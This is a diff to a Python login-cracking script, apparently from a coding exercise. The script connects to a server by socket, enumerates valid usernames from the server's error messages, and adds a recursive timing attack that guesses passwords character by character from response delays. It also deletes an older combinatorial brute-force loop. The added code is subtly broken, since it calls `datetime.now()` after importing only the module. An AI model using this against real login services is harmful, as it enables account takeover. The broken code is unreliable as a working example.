@@ -3,6 +3,7 @@ import sys
 import socket
 import itertools
 import json
+import datetime
 
 args = sys.argv
 
@@ -26,16 +27,11 @@ def generate_alphanumeric_list():
 
 
 def send_message(sock, message):
-	message = message.encode(encoding="utf-8")
+	message = message.encode()
 	sock.send(message)
 
 
 def generate_combinations(string):
-	# length = len(string)
-	# string += string.upper()
-	# string = list(string)
-	# for item in itertools.combinations(string, length):
-	# 	yield "".join(item)
 	string = string.lower()
 	mx = 2 ** len(string)
 
@@ -49,6 +45,32 @@ def generate_combinations(string):
 		yield "".join(combination)
 
 
+def get_pass(client_socket, login, letters=""):
+    alpha = generate_alphanumeric_list()
+    differences = []
+    exit_flag = False
+    result = ''
+    for ch in alpha:
+        json_string1 = json.dumps({"login": login, "password": letters + ch})
+        start = datetime.now()
+        client_socket.send(json_string1.encode())
+        response1 = client_socket.recv(1024)
+        finish = datetime.now()
+        response1 = response1.decode()
+        decoded_data1 = json.loads(response1)
+        difference = finish - start
+        if decoded_data1["result"] == "Connection success!":
+            exit_flag = True
+            result = json_string1
+            break
+        differences.append((difference, ch))
+    max_diff = max(differences)
+    if not exit_flag:
+        return get_pass(client_socket, login, letters + max_diff[1])
+    else:
+        return result
+
+
 def main():
 	passwords = []
 	logins = []
@@ -60,27 +82,6 @@ def main():
 	with open("logins.txt", "r") as login_file:
 		logins = login_file.read().split("\n")
 
-	# for login in logins:
-	# 	for x in range(1, len(alphanumeric) + 1):
-	# 		for item in itertools.combinations_with_replacement(alphanumeric, x):
-	# 			password = "".join(item)
-	#
-	# 			message = {"login": login, "password": password}
-	# 			json_message = json.dumps(message)
-	# 			send_message(new_socket, json_message)
-	# 			response = new_socket.recv(1024).decode()
-	# 			json_response = json.loads(response)
-	# 			if json_response["result"] == "Connection success!":
-	# 				password_flag = True
-	# 				print(json_message)
-	# 				break
-	# 			elif json_response["result"] == "Wrong Password!":
-	# 				login_flag = True
-	# 			elif json_response["result"] == "Wrong Login!":
-	# 				break
-	#
-	# 		if password_flag:
-	# 			break
 	real_login = ""
 	for login in logins:
 		message = {"login": login, "password": ""}
@@ -88,24 +89,9 @@ def main():
 		send_message(new_socket, json_message)
 		response = new_socket.recv(1024).decode()
 		json_response = json.loads(response)
-		if json_response["result"] == "Wrong password!":
-			real_login = login
-			break
-
-	for x in range(1, 10):
-		for item in itertools.combinations_with_replacement(alphanumeric, x):
-			password = "".join(item)
-
-			message = {"login": real_login, "password": password}
-			json_message = json.dumps(message, indent=4)
-			send_message(new_socket, json_message)
-			response = new_socket.recv(1024).decode()
-			json_response = json.loads(response)
-			if json_response["result"] == "Connection success!":
-				password_flag = True
-				print(json_message)
-				break
-
+		if json_response["result"] == "Wrong password!" or json_response["result"] == \
+				"Exception happened during login":
+				print(get_pass(new_socket, login))
 	new_socket.close()
 
 
